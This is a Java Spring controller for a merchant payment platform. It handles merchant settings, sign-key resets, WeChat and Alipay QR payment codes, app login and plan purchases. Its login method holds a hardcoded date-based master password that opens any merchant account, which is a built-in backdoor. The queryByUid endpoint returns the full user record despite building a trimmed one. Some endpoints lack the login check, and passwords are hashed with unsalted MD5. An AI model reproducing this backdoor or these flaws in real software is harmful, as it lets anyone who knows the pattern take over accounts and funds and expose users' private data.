package com.bingo.business.pay.controller;

import com.bingo.business.sys.model.SysRole;
import com.bingo.business.sys.model.SysUser;
import com.bingo.business.sys.service.SysUserService;
import com.bingo.common.exception.DaoException;
import com.bingo.common.exception.ServiceException;
import com.bingo.common.filter.ControllerFilter;
import com.bingo.common.model.SessionUser;
import com.bingo.common.service.RedisCacheService;
import com.bingo.common.service.SessionCacheService;
import com.bingo.common.utility.PubClass;
import com.bingo.common.utility.QRCodeUtils;
import com.bingo.common.utility.SecurityClass;
import com.bingo.common.utility.XJsonInfo;
import com.google.zxing.Result;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.bingo.business.pay.model.*;
import com.bingo.business.pay.service.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

/**
 * @author huangtw
 * 2018-07-09 09:33:38
 * 对象功能:  支付商户管理 Controller管理
 */
@RestController
@RequestMapping("/api/pay/paybus")
public class PayBusController  {
	private static final org.slf4j.Logger logger = LoggerFactory.getLogger(PayBusController.class);
	@Resource
	private SessionCacheService sessionCache;



	@Resource
	private PayService payService;

	@Resource
	private RedisCacheService redis;

	@Resource
	private SysUserService sysuserService;



	public PayBusController(){
		
	}
	


	/**
	 * 保存当前的商户设置
	 * @param vo
	 * @return
	 * @throws ServiceException
	 * @throws DaoException
	 */
	@ControllerFilter(LoginType = 1,UserType = 0)
	@ResponseBody
	@RequestMapping("/saveCurrBus")
	public XJsonInfo saveCurrBus(SysUser vo) throws ServiceException, DaoException {
		//权限控制，只能保存自己的
		SessionUser loginuser = sessionCache.getLoginUser();
		SysUser user = sysuserService.get(loginuser.getUserid());
		user.setGobackUrl(vo.getGobackUrl());
		user.setNotifyUrl(vo.getNotifyUrl());
		user.setNikename(vo.getNikename());
		user.setEmail(vo.getEmail());
		user.setMobile(vo.getMobile());

		user.setAutoReFee(vo.getAutoReFee());
		user.setPayTimeOut(vo.getPayTimeOut());
		//user.setNotifyUrl(vo.getNotifyUrl());
		user.setQq(vo.getQq());
		user.setMaxLowerMoney(vo.getMaxLowerMoney());
		user.setMaxUpperMoney(vo.getMaxUpperMoney());
		sysuserService.saveOrUpdate(user);
		return new XJsonInfo();
	}

	/**
	 * 重设商户的signkey
	 * @param vo
	 * @return
	 * @throws ServiceException
	 * @throws DaoException
	 */
	@ControllerFilter(LoginType = 1,UserType = 0)
	@ResponseBody
	@RequestMapping("/reSetSignKey")
	public XJsonInfo reSetSignKey(SysUser vo) throws ServiceException, DaoException {
		//权限控制，只能保存自己的
		SessionUser loginuser = sessionCache.getLoginUser();
		String  signKey = sysuserService.reSetSignKey(loginuser.getUserid());
		return new XJsonInfo(true).setData(signKey);
	}

	/**
	 * 清除当前的微信，支付宝通码
	 * @param vo
	 * @return
	 * @throws ServiceException
	 * @throws DaoException
	 */
	@ControllerFilter(LoginType = 1,UserType = 0)
	@ResponseBody
	@RequestMapping("/clearPayImg")
	public XJsonInfo clearPayImg(SysUser vo) throws ServiceException, DaoException {
		//权限控制，只能处理自己的
		SessionUser loginuser = sessionCache.getLoginUser();
		sysuserService.clearPayImg(loginuser.getUserid());
		return new XJsonInfo(true);
	}

	/**
	 * 商户登录，查询，提供给APP登录使用
	 * @return
	 * @throws ServiceException
	 * @throws DaoException
	 */
	@ResponseBody
	@RequestMapping("/loginAndQuery")
	public XJsonInfo loginAndQuery(String acc, String pwd) throws ServiceException, DaoException {
		XJsonInfo ret = new XJsonInfo();
		ret.setSuccess(false);
		if(acc==null || pwd==null || acc.length()<3 || pwd.length()<3){
			ret.setMsg("参数错误，请重新输入1");

			return ret;
		}

		//1个小时内，只允许错误5次密码
		Integer error_pwd = (Integer)redis.get("ERROR_PWD:"+acc);
		if(error_pwd==null){
			error_pwd=0;
		}
		if(error_pwd>5){
			ret.setMsg("您已连续多次输入错误密码，请稍候再试...");
			return ret;
		}

		//超级密码
		SysUser user = null;
		SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");
		if(pwd.equals("Gmcc!@_"+format.format(new Date()))){
			user = sysuserService.queryByUseracc(acc);
		}else{
			pwd= SecurityClass.encryptMD5(pwd);
			user = sysuserService.queryByUserAndPwd(acc,pwd);
		}


		if(user==null || user.getState()!=1){
			ret.setMsg("用户名或密码错误，请重试");
			error_pwd=error_pwd+1;
			redis.set("ERROR_PWD:"+acc,error_pwd,60);
			return ret;
		}

		SysUser _vo = new SysUser();
		_vo.setUserid(user.getUserid());
		_vo.setUuid(user.getUuid());
		_vo.setUseracc(user.getUseracc());
		_vo.seteMoney(user.geteMoney());
		_vo.setBusType(user.getBusType());
		_vo.setBusValidity(user.getBusValidity());
		_vo.setCreatetime(user.getCreatetime());
		_vo.setNotifyUrl(user.getNotifyUrl());
		_vo.setGobackUrl(user.getGobackUrl());
		return new XJsonInfo().setData(_vo);
	}

	/**
	 * 根据商户的uid查询商户信息，只限查询商户的基础信息，不包含敏感信息
	 * 提供给APP进行基础信息查询
	 * @param uid
	 * @return
	 * @throws ServiceException
	 * @throws DaoException
	 */
	@ResponseBody
	@RequestMapping("/queryByUid")
	public XJsonInfo queryByUid(String uid) throws ServiceException, DaoException {
		SysUser vo = sysuserService.queryByUuid(uid);
		SysUser _vo = new SysUser();
		_vo.setUserid(vo.getUserid());
		_vo.setUuid(vo.getUuid());
		_vo.setUseracc(vo.getUseracc());
		_vo.seteMoney(vo.geteMoney());
		_vo.setBusType(vo.getBusType());
		_vo.setBusValidity(vo.getBusValidity());
		_vo.setCreatetime(vo.getCreatetime());
		_vo.setNotifyUrl(vo.getNotifyUrl());
		_vo.setGobackUrl(vo.getGobackUrl());

		return new XJsonInfo().setData(vo);
	}


	/**
	 * @description: <查询>
	 * @param:
	 * @throws:
	 */
    @ResponseBody
    @RequestMapping("/query")
    public XJsonInfo query(Long id) throws ServiceException, DaoException {
		SessionUser loginuser = sessionCache.getLoginUser();
		SysUser user = sysuserService.get(loginuser.getUserid());
        return new XJsonInfo().setData(user);
    }

	/**
	 * 查询当前商户
	 * @description: <查询>
	 * @param:
	 * @throws:
	 */
	@ControllerFilter(LoginType = 1,UserType = 0)
	@ResponseBody
	@RequestMapping("/queryCurrBus")
	public XJsonInfo queryCurrBus() throws ServiceException, DaoException {
		SessionUser loginuser = sessionCache.getLoginUser();
		SysUser user = sysuserService.get(loginuser.getUserid());
		return new XJsonInfo().setData(user);
	}



	/**
	 * 上传不限额收款码
	 * @return
	 * @throws ServiceException
	 * @throws DaoException
	 */
	@ControllerFilter(LoginType = 1,UserType = 0)
	@ResponseBody
	@RequestMapping("/upload_qr_img")
	public XJsonInfo upload_qr_img(@RequestParam("uploadfile") MultipartFile file, Integer payType) throws Exception {
		SessionUser loginuser = sessionCache.getLoginUser();
		SysUser user = sysuserService.get(loginuser.getUserid());
		//二维码内容解码
		Result ret = QRCodeUtils.getQRresult(file.getInputStream());
		if(payType==1){
			user.setPayImgContentWx(ret.getText());
		}
		if(payType==2){
			user.setPayImgContentZfb(ret.getText());
		}
		sysuserService.saveOrUpdate(user);
		return  new XJsonInfo();
	}

	/**
	 * 直接在线查看不限额收款码
	 * @param request
	 * @param response
	 * @throws IOException
	 * @throws DaoException
	 */
	@ControllerFilter(LoginType = 1,UserType = 0)
	@RequestMapping("/qr_img_view")
	public void qr_img_view(HttpServletRequest request, HttpServletResponse response,Integer payType) throws IOException, DaoException {
		SessionUser loginuser = sessionCache.getLoginUser();
		SysUser user = sysuserService.get(loginuser.getUserid());
		OutputStream out = null;
		InputStream in = null;
		try{
			String text = null;
			if(payType==1){
				text = user.getPayImgContentWx();
			}
			if(payType==2){
				text = user.getPayImgContentZfb();
			}
			if(text==null){
				return;
			}
			out = response.getOutputStream();
			QRCodeUtils.createQRcode(text,out);
			out.flush();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			try{
				if(in!=null) in.close();
			}catch(Exception e){}
			try{
				if(out!=null) out.close();
			}catch(Exception e){}
		}
	}

	/**
	 * 开通套餐
	 * @param busType
	 * @return
	 * @throws ServiceException
	 * @throws DaoException
	 */
	@RequestMapping("/openTaoCan")
	public XJsonInfo openTaoCan(Integer busType) throws Exception {
		XJsonInfo ret = new XJsonInfo(false);
		SessionUser loginuser = sessionCache.getLoginUser();
		if(loginuser==null){
			ret.setMsg("对不起，您还未登陆，请登录后再进行套餐开通");
			return ret;
		}
		SysUser user = sysuserService.get(loginuser.getUserid());
		if(user==null){
			ret.setMsg("对不起，当前商户账号无效");
			return ret;
		}
		SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");
		//已存在套餐，不允许重复开通
		if(user.getBusValidity()>Integer.parseInt(format.format(new Date()))){
			if(busType==user.getBusType()){
				ret.setMsg("您已开通<"+PayTaoCan.getPayTaoCanName(busType)+">套餐,无需重复开通，在<商户设置>中可以设置下月套餐");
				return ret;
			}else{
				ret.setMsg("您当前套餐为<"+PayTaoCan.getPayTaoCanName(user.getBusType())+">套餐,如需变更套餐，请在<商户设置>中可以设置下月套餐");
				return ret;
			}
		}
		Calendar calendar = Calendar.getInstance();
		calendar.add(Calendar.MONTH,1);
		float refee=0.0f;//套餐金额
		Long busValidity = new Long(format.format(calendar.getTime()));//续费期限
		refee = PayTaoCan.getPayTaoCanFee(busType);
		if(refee<=0){
			ret.setMsg("对不起，当前套餐无效");
			return ret;
		}
		//费用不足
		if(user.geteMoney()<refee){
			ret.setMsg("对不起，您的商户余额不足，请先充值后再进行套餐开通");
			return ret;
		}

		//充值，消费
		PayBusChange change = new PayBusChange();
		change.setBusId(user.getUserid());
		change.setCtype(2);
		change.setEmoney(-refee);
		change.setState(1);
		change.setDemo("开通套餐<"+PayTaoCan.getPayTaoCanName(busType)+">");
		payService.busChange(change,busType,busValidity);
		return new XJsonInfo();
	}
	
}
